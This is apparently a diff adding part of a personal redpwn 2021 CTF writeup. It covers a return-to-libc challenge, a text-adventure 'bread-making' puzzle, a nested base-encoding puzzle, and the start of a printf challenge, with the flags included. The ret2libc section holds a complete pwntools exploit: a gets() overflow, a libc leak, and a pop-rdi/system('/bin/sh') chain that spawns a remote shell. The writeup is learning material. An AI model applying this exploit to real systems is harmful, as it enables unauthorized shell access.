@@ -717,3 +717,146 @@ int main(void)
 
 All 4 downloadble files for this challenge can be found <a href="https://github.com/Angmar2722/Angmar2722.github.io/tree/master/assets/ctfFiles/redpwn2021/ret2theUnknown" target="_blank">here</a>.
 
+If the challenge name and descriptions weren't glaring enough, what we had to perform was a <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" target="_blank">Return-to-libc attack</a>.
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img14.jpg)
+
+What we had to do was overflow the buffer (we can do that as there is a gets() call) and change the return address of main to `system` in libc. After that, we had to find a pointer to a shell (in our case /bin/sh) and if this argument (/bin/sh) is passed into system, it will spawn a shell and with that we could read any flag file in the server directory. We could use a libc function like `printf` whose address is conviniently given to us in the line `printf("rob said i'd need this to get there: %llx\n", printf);` ;D
+
+In order to solve this challenge, I mostly read this <a href="https://wiki.bi0s.in/pwning/return2libc/return-to-libc/" target="_blank">this explanation</a> of how a Return-to-libc attack worked and <a href="https://tripoloski1337.github.io/ctf/2020/01/26/return-to-libc-attack.html" target="_blank">this writeup</a> for how to implement the attack using `printf` as the libc function. Other useful resources are listed in the solve script below :
+
+```python
+
+from pwn import *
+
+main = 0x401186
+BINSH = 0x7ffff7f69152
+POP_RDI = 0x4012a3
+
+p = (32 * b'A') + (8 * b'A') + p64(main)
+#r = process("./ret2the-unknown")
+r = remote('mc.ax', 31568)
+
+libc = ELF("libc-2.28.so")
+
+r.recvuntil("where is this place? can you help me get there safely?\n")
+r.sendline(p)
+r.recvuntil("rob said i'd need this to get there: ")
+printf_leak = r.recvline().decode()
+printf_leak = int(printf_leak, 16)
+
+libc_base = printf_leak - libc.symbols['printf']
+libc_system = libc_base + libc.symbols['system']
+binsh_str = libc_base + next(libc.search(b"/bin/sh"))
+
+p = (32 * b'A') + (8 * b'A') + p64(POP_RDI) + p64(binsh_str) + p64(libc_system) 
+r.recvuntil("where is this place? can you help me get there safely?\n")
+r.sendline(p)
+r.interactive()
+
+#https://tripoloski1337.github.io/ctf/2020/01/26/return-to-libc-attack.html
+#https://hurricanelabs.com/blog/csi-ctf-2020-pwn-intended-0x3-with-unnecessary-arbitrary-rce/
+
+#https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-pwn-template
+#https://gr4n173.github.io/2020/07/11/ret2libc.html
+
+```
+
+And after running the script, we spawned a shell and got the flag :
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img15.png)
+
+<p> <b>Flag :</b> flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing} </p>
+
+<br/>
+
+## Bread-Making
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img16.png)
+
+This is easily one of the weirdest challenges that I have ever solved. We were given this <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/master/assets/ctfFiles/redpwn2021/bread" target="_blank">executable</a>. There would be a command given such as "add ingredients to the bowl" and we would have to find the right command such as "add flour" or "add yeast". There were some really weird situations such as when "the ingredients are added and stirred into a lumpy dough", the correct option was to "hide the bowl inside a box". TO avoid losing the game or story or whatever, we had to avoid the following conditions by the time we chose to go to sleep :
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img17.png)
+
+This was the story of a boy who just wanted to bake bread but in the process of doing so, he nearly set his house on fire.... And for some reason he didn't want his mom or brother to know that he was making bread. Weird D:
+
+The solve script :
+
+```python
+
+from pwn import *
+
+r = remote('mc.ax', 31796)
+
+r.recvuntil("add ingredients to the bowl\n")
+r.sendline("add flour")
+r.recvuntil("flour has been added\n")
+r.sendline("add yeast")
+r.recvuntil("yeast has been added\n")
+r.sendline("add salt")
+r.recvuntil("salt has been added\n")
+r.sendline("add water")
+
+r.recvuntil("the ingredients are added and stirred into a lumpy dough\n")
+r.sendline("hide the bowl inside a box")
+r.recvuntil("the bread needs to rise\n")
+r.sendline("wait 3 hours")
+r.recvuntil('it is time to finish the dough\n')
+r.sendline('work in the basement')
+
+r.recvuntil('the dough is done, and needs to be baked\n')
+r.sendline('preheat the toaster oven')
+r.recvuntil('the bread is in the oven, and bakes for 45 minutes\n')
+r.sendline("set a timer on your phone")
+r.recvuntil('45 minutes is an awfully long time\n')
+r.sendline('watch the bread bake')
+
+r.recvuntil("there's no time to waste\n")
+r.sendline('pull the tray out with a towel')
+r.recvuntil("there's smoke in the air\n")
+r.sendline("open the window")
+r.recvuntil('cold air rushes in\n')
+r.sendline('unplug the fire alarm')
+r.recvuntil('you put the fire alarm in another room\n')
+r.sendline('unplug the oven')
+
+r.recvuntil("the kitchen is a mess\n")
+r.sendline('wash the sink')
+r.recvuntil('the sink is cleaned\n')
+r.sendline('clean the counters')
+r.recvuntil('the counters are cleaned\n')
+r.sendline('flush the bread down the toilet')
+r.recvuntil('the half-baked bread is disposed of\n')
+
+r.sendline("get ready to sleep")
+r.recvuntil('time to go to sleep\n')
+r.sendline('close the window')
+r.recvuntil("the window is closed\n")
+r.sendline('replace the fire alarm')
+r.sendline("brush teeth and go to bed")
+
+print(r.recvall())
+
+```
+
+<p> <b>Flag :</b> flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight} </p>
+
+<br/>
+
+## Round-The-Bases
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img18.png)
+
+We were given <a href="https://github.com/Angmar2722/Angmar2722.github.io/blob/master/assets/ctfFiles/redpwn2021/round-the-bases" target="_blank">this file</a>. It was encoded in base 85. Decoding that would give us a base 64 string. Decoding that gave us integers. Treating those integers as hexadecimal and converting that to base 10 and then converting those integers to bytes gave us this :
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img19.png)
+
+54, 49, 48 and 32 (in hex) are T, I, H and 2 respectively. If you remove T and 2 and treat H as 0 and I as 1, you get a binary string which when decoded would yield the flag.
+
+<p> <b>Flag :</b> flag{w0w_th4t_w4s_4ll_wr4pp3d_up} </p>
+
+<br/>
+
+## Printf-Please
+
+![Redpwn 2021 Writeup](/assets/img/ctfImages/redpwn2021/img20.png)
